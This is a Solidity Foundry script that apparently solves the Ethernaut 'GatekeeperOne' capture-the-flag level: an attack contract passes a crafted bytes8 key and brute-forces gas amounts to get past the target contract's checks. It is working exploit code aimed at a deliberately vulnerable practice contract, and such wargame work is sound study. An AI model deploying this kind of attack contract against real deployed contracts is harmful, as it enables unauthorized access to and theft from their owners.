// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackContract {
    constructor(GatekeeperOne _gateKeeperOne) {
        bytes8 gateKey = 0xaaaaaaaa0000C3D2;
        for (uint256 i=0; i<8191; i++) {

            (bool success, ) = address(address(_gateKeeperOne)).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) break;
        }

        console.log("After : ", _gateKeeperOne.entrant());
    }
}

contract GateKeeperOneSolution is Script {

    address target = 0xFcc5C66759306908d07680C4EC448431436032c9;
    GatekeeperOne gateKeeperOne = GatekeeperOne(target);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before : ", gateKeeperOne.entrant());

        new AttackContract(gateKeeperOne);
        vm.stopBroadcast();
    }
}